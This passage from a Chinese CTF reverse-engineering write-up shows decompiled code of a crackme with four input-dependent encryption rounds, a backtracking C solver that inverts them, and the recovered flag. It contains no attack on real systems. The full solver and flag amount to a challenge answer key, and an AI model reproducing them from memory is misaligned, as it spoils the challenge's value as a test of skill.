= pbox2;</span><br><span class="line">    pppbox1 = pbox1;</span><br><span class="line">    ppbox3 = pbox3;</span><br><span class="line">    ppbox4 = pbox4;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      *pppbox1++ = v9++;                        <span class="comment">// 造盒</span></span><br><span class="line">    <span class="keyword">while</span> ( v9 &lt; <span class="number">256</span> );</span><br><span class="line">    v14 = <span class="number">512</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15 = rand();</span><br><span class="line">      v16 = rand();</span><br><span class="line">      v17 = ppbox1[v15];</span><br><span class="line">      ppbox1[v15] = ppbox1[v16];                <span class="comment">// 打乱盒</span></span><br><span class="line">      ppbox1[v16] = v17;</span><br><span class="line">      --v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v14 );</span><br><span class="line">    v18 = <span class="number">0</span>;</span><br><span class="line">    v19 = ppbox2;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      *v19++ = v18++;</span><br><span class="line">    <span class="keyword">while</span> ( v18 &lt; <span class="number">32</span> );</span><br><span class="line">    v20 = <span class="number">32</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v21 = rand() % <span class="number">32</span>;</span><br><span class="line">      v22 = rand() % <span class="number">32</span>;</span><br><span class="line">      v23 = ppbox2[v21];</span><br><span class="line">      ppbox2[v21] = ppbox2[v22];                <span class="comment">// 打乱box2</span></span><br><span class="line">      ppbox2[v22] = v23;</span><br><span class="line">      --v20;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v20 );</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>i64; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">      ppbox3[i] = rand();</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>i64; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">      ppbox4[j] = rand();</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      (v28[Buf1[v3++] &amp; <span class="number">3</span>])(Buf1, &amp;pbox1);</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; <span class="number">32</span> );</span><br><span class="line">    v26 = <span class="built_in">memcmp</span>(Buf1, &amp;unk_7FF6C6665AD0, <span class="number">0x20u</span>i64);</span><br><span class="line">    v7 = <span class="string">&quot;right\n&quot;</span>;</span><br><span class="line">    v4 = <span class="string">&quot;wrong\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v26 )</span><br><span class="line">      v7 = <span class="string">&quot;wrong\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="string">&quot;wrong\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_7FF6C6641020(v7, v4, v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，也是四种加密方式，不同的是加密逻辑是根据输入的每一位&amp;3，形成的结果进行加密，32轮，如此一来解密时就需要知道上一轮经过什么加密，我先对当前轮对应的明文元素称之为，加密种数，我的想法是，先将密文四种都尝试解密，解密后的加密种数&amp;3，查看是否结果与它所经过的加密一致</p><p>但同时有新的问题，如果它的解密结果刚好一致呢？所以要采取回溯法，就像走迷宫一样，这条路走不通，就回退换路，实现我选用递归</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box3[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x7D</span>, <span class="number">0xB7</span>, <span class="number">0x24</span>, <span class="number">0x7E</span>, <span class="number">0xC3</span>, <span class="number">0x6B</span>, <span class="number">0xBD</span>, <span class="number">0xD8</span>, <span class="number">0x7F</span>, <span class="number">0x13</span>, <span class="number">0x6E</span>, <span class="number">0x0F</span>, <span class="number">0x43</span>, <span class="number">0xCD</span>, <span class="number">0x6B</span>, <span class="number">0xCF</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x4F</span>, <span class="number">0x26</span>, <span class="number">0x18</span>, <span class="number">0x12</span>, <span class="number">0x2A</span>, <span class="number">0x7E</span>, <span class="number">0x9B</span>, <span class="number">0x27</span>, <span class="number">0x4C</span>, <span class="number">0x33</span>, <span class="number">0x67</span>, <span class="number">0x40</span>, <span class="number">0xC9</span>, <span class="number">0x9E</span>, <span class="number">0xC4</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box4[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x91</span>, <span class="number">0xDB</span>, <span class="number">0x9F</span>, <span class="number">0x5F</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0xD6</span>, <span class="number">0xA8</span>, <span class="number">0xBF</span>, <span class="number">0x41</span>, <span class="number">0x16</span>, <span class="number">0x79</span>, <span class="number">0xDE</span>, <span class="number">0x73</span>, <span class="number">0x16</span>, <span class="number">0xF8</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0xBA</span>, <span class="number">0x6A</span>, <span class="number">0xBE</span>, <span class="number">0xC6</span>, <span class="number">0x12</span>, <span class="number">0xB2</span>, <span class="number">0x39</span>, <span class="number">0x9E</span>, <span class="number">0xF3</span>, <span class="number">0x12</span>, <span class="number">0x4E</span>, <span class="number">0x02</span>, <span class="number">0x1C</span>, <span class="number">0xE2</span>, <span class="number">0x43</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box2[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x1D</span>, <span class="number">0x01</span>, <span class="number">0x0D</span>, <span class="number">0x07</span>, <span class="number">0x15</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x16</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0x03</span>, <span class="number">0x12</span>, <span class="number">0x04</span>, <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x1A</span>, <span class="number">0x1C</span>, <span class="number">0x1E</span>, <span class="number">0x19</span>, <span class="number">0x09</span>, <span class="number">0x1B</span>, <span class="number">0x11</span>, <span class="number">0x0B</span>, <span class="number">0x17</span>, <span class="number">0x0A</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box1[<span class="number">256</span>] = &#123;</span><br><span class="line">    <span class="number">0xB0</span>, <span class="number">0xF0</span>, <span class="number">0x21</span>, <span class="number">0xCF</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, <span class="number">0x3A</span>, <span class="number">0x68</span>, <span class="number">0x84</span>, <span class="number">0x7B</span>, <span class="number">0x39</span>, <span class="number">0x86</span>, <span class="number">0x36</span>, <span class="number">0x87</span>, <span class="number">0x9B</span>, <span class="number">0xF7</span>,</span><br><span class="line">    <span class="number">0x3D</span>, <span class="number">0x18</span>, <span class="number">0x1E</span>, <span class="number">0x61</span>, <span class="number">0x1B</span>, <span class="number">0x2E</span>, <span class="number">0x6C</span>, <span class="number">0xDF</span>, <span class="number">0x2C</span>, <span class="number">0xAE</span>, <span class="number">0x65</span>, <span class="number">0x9D</span>, <span class="number">0xEB</span>, <span class="number">0x2F</span>, <span class="number">0xDA</span>, <span class="number">0xF4</span>,</span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0xCA</span>, <span class="number">0x56</span>, <span class="number">0x92</span>, <span class="number">0x75</span>, <span class="number">0x3B</span>, <span class="number">0x62</span>, <span class="number">0x45</span>, <span class="number">0x06</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x33</span>, <span class="number">0x6E</span>, <span class="number">0x25</span>, <span class="number">0xCE</span>, <span class="number">0xA3</span>,</span><br><span class="line">    <span class="number">0xD2</span>, <span class="number">0x44</span>, <span class="number">0xA1</span>, <span class="number">0x4A</span>, <span class="number">0x58</span>, <span class="number">0xB1</span>, <span class="number">0xA0</span>, <span class="number">0x2A</span>, <span class="number">0x47</span>, <span class="number">0x0A</span>, <span class="number">0x02</span>, <span class="number">0xAF</span>, <span class="number">0x50</span>, <span class="number">0xC3</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>,</span><br><span class="line">    <span class="number">0xE5</span>, <span class="number">0x0D</span>, <span class="number">0x67</span>, <span class="number">0x91</span>, <span class="number">0xE1</span>, <span class="number">0x51</span>, <span class="number">0xE3</span>, <span class="number">0xC1</span>, <span class="number">0xAA</span>, <span class="number">0x95</span>, <span class="number">0x5C</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0x1C</span>, <span class="number">0x3F</span>, <span class="number">0xB8</span>,</span><br><span class="line">    <span class="number">0xE8</span>, <span class="number">0x1F</span>, <span class="number">0xFF</span>, <span class="number">0x7A</span>, <span class="number">0x73</span>, <span class="number">0x26</span>, <span class="number">0x54</span>, <span class="number">0x9E</span>, <span class="number">0xED</span>, <span class="number">0xA9</span>, <span class="number">0x41</span>, <span class="number">0x20</span>, <span class="number">0xEF</span>, <span class="number">0xA6</span>, <span class="number">0x48</span>, <span class="number">0x97</span>,</span><br><span class="line">    <span class="number">0x4F</span>, <span class="number">0xD4</span>, <span class="number">0xBB</span>, <span class="number">0x23</span>, <span class="number">0x66</span>, <span class="number">0xD9</span>, <span class="number">0xE4</span>, <span class="number">0x0B</span>, <span class="number">0x30</span>, <span class="number">0x15</span>, <span class="number">0xD7</span>, <span class="number">0x6B</span>, <span class="number">0x19</span>, <span class="number">0xCD</span>, <span class="number">0xC4</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0xC8</span>, <span class="number">0x14</span>, <span class="number">0xFD</span>, <span class="number">0x7F</span>, <span class="number">0x28</span>, <span class="number">0x0E</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x6F</span>, <span class="number">0xF5</span>, <span class="number">0x90</span>, <span class="number">0x76</span>, <span class="number">0xBF</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0xE7</span>, <span class="number">0x24</span>, <span class="number">0x78</span>, <span class="number">0x6D</span>, <span class="number">0x71</span>, <span class="number">0xA8</span>, <span class="number">0x43</span>, <span class="number">0xB5</span>, <span class="number">0x0C</span>, <span class="number">0x31</span>, <span class="number">0xF9</span>, <span class="number">0xA2</span>, <span class="number">0x9C</span>, <span class="number">0x99</span>, <span class="number">0xF6</span>, <span class="number">0x2D</span>,</span><br><span class="line">    <span class="number">0xDB</span>, <span class="number">0xB7</span>, <span class="number">0xC9</span>, <span class="number">0x85</span>, <span class="number">0x81</span>, <span class="number">0x03</span>, <span class="number">0x64</span>, <span class="number">0x1D</span>, <span class="number">0x07</span>, <span class="number">0x34</span>, <span class="number">0x5A</span>, <span class="number">0xBD</span>, <span class="number">0x37</span>, <span class="number">0x4C</span>, <span class="number">0xA7</span>, <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x46</span>, <span class="number">0xE9</span>, <span class="number">0x35</span>, <span class="number">0x93</span>, <span class="number">0x8D</span>, <span class="number">0xA5</span>, <span class="number">0xFB</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0xC2</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x77</span>, <span class="number">0xC6</span>, <span class="number">0x53</span>,</span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0x4D</span>, <span class="number">0xB2</span>, <span class="number">0x10</span>, <span class="number">0x2B</span>, <span class="number">0xF8</span>, <span class="number">0x88</span>, <span class="number">0x6A</span>, <span class="number">0x3E</span>, <span class="number">0xD0</span>, <span class="number">0x7C</span>, <span class="number">0x63</span>, <span class="number">0x40</span>, <span class="number">0x27</span>, <span class="number">0xBE</span>, <span class="number">0xD5</span>,</span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0xD1</span>, <span class="number">0x74</span>, <span class="number">0xB6</span>, <span class="number">0x57</span>, <span class="number">0x94</span>, <span class="number">0xAB</span>, <span class="number">0x8A</span>, <span class="number">0xB9</span>, <span class="number">0xBC</span>, <span class="number">0x7D</span>, <span class="number">0xB3</span>, <span class="number">0x96</span>, <span class="number">0x7E</span>, <span class="number">0xFC</span>, <span class="number">0xAD</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x4E</span>, <span class="number">0xFA</span>, <span class="number">0xE0</span>, <span class="number">0xCB</span>, <span class="number">0x8B</span>, <span class="number">0xEE</span>, <span class="number">0x32</span>, <span class="number">0xA4</span>, <span class="number">0x16</span>, <span class="number">0xFE</span>, <span class="number">0x5B</span>, <span class="number">0x13</span>, <span class="number">0xDD</span>, <span class="number">0xC0</span>, <span class="number">0x9A</span>,</span><br><span class="line">    <span class="number">0x5E</span>, <span class="number">0x8E</span>, <span class="number">0x29</span>, <span class="number">0xF3</span>, <span class="number">0x8F</span>, <span class="number">0x49</span>, <span class="number">0xE6</span>, <span class="number">0x9F</span>, <span class="number">0xF1</span>, <span class="number">0xC5</span>, <span class="number">0x70</span>, <span class="number">0x55</span>, <span class="number">0x8C</span>, <span class="number">0x11</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>,</span><br><span class="line">    <span class="number">0xEC</span>, <span class="number">0x00</span>, <span class="number">0xAC</span>, <span class="number">0x89</span>, <span class="number">0xD3</span>, <span class="number">0x82</span>, <span class="number">0x69</span>, <span class="number">0xD6</span>, <span class="number">0xBA</span>, <span class="number">0xD8</span>, <span class="number">0x59</span>, <span class="number">0x98</span>, <span class="number">0x09</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xC7</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox1[<span class="number">256</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">initsbox1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sbox1[box1[i]] = i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> <span class="title function_">ror</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> a, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (a &gt;&gt; i) | (a &lt;&lt; (<span class="number">8</span> - i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrpty0</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* flag)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = sbox1[flag[i]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrpty1</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* flag)</span> &#123;</span><br><span class="line">    <span class="type">char</span> v2[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">32</span>;i++)</span><br><span class="line">        v2[i] = flag[box2[i]];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">32</span>;i++)</span><br><span class="line">        flag[i] = v2[box2[i]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrpty2</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* flag)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        flag[i] -= box4[i];</span><br><span class="line">        flag[i] ^= box3[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrpty3</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* flag)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">32</span>;i++) &#123;</span><br><span class="line">        flag[i] = ror(flag[i], <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrpty</span><span class="params">(<span class="type">char</span>* flag, <span class="type">int</span> now)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (now &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(flag, <span class="string">&quot;flag&quot;</span>, <span class="number">4</span>)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> tryflag[<span class="number">33</span>];</span><br><span class="line">        <span class="built_in">memcpy</span>(tryflag, flag, <span class="number">33</span>);</span><br><span class="line">        <span class="keyword">switch</span> (i) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:decrpty0(tryflag);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:decrpty1(tryflag);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:decrpty2(tryflag);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:decrpty3(tryflag);<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((tryflag[now] &amp; <span class="number">3</span>) == i) &#123;</span><br><span class="line">            decrpty((<span class="type">char</span>*)tryflag, now - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> flag[] = &#123;</span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x3E</span>, <span class="number">0x43</span>, <span class="number">0xB8</span>, <span class="number">0xBA</span>, <span class="number">0xDB</span>, <span class="number">0xF6</span>, <span class="number">0x88</span>, <span class="number">0x25</span>, <span class="number">0x1B</span>, <span class="number">0x28</span>, <span class="number">0xC7</span>, <span class="number">0xC0</span>, <span class="number">0x54</span>, <span class="number">0xA6</span>, <span class="number">0x4A</span>,</span><br><span class="line">        <span class="number">0x90</span>, <span class="number">0x37</span>, <span class="number">0xBC</span>, <span class="number">0x29</span>, <span class="number">0x41</span>, <span class="number">0xAA</span>, <span class="number">0x28</span>, <span class="number">0xDB</span>, <span class="number">0x9A</span>, <span class="number">0x59</span>, <span class="number">0x63</span>, <span class="number">0x9E</span>, <span class="number">0x4B</span>, <span class="number">0xCF</span>, <span class="number">0x2E</span>, <span class="number">0x41</span>,</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    initsbox1();</span><br><span class="line">    decrpty(flag, <span class="number">31</span>);</span><br><span class="line">    <span class="comment">//flag&#123;Ea5y_enCrypt_And_decrYpt!!&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
